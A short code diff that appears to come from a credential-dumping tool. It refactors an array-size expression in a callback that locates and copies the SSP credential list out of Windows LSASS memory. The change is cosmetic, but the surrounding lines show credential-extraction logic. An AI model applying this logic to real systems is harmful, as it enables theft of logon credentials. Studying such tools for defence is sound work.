@@ -38,7 +38,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_ssp(IN PKIWI_BASIC_SECURITY_LO
 	KULL_M_MEMORY_ADDRESS aBuffer = {&mesCredentials, &hBuffer}, aLsass = {NULL, pData->cLsass->hLsassMem};
 	ULONG monNb = 0;
 
-	if(kuhl_m_sekurlsa_ssp_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_ssp_package.Module, SspReferences, sizeof(SspReferences) / sizeof(KULL_M_PATCH_GENERIC), (PVOID *) &SspCredentialList, NULL, NULL))
+	if(kuhl_m_sekurlsa_ssp_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_ssp_package.Module, SspReferences, ARRAYSIZE(SspReferences), (PVOID *) &SspCredentialList, NULL, NULL))
 	{
 		aLsass.address = SspCredentialList;
 		if(kull_m_memory_copy(&aBuffer, &aLsass, sizeof(LIST_ENTRY)))
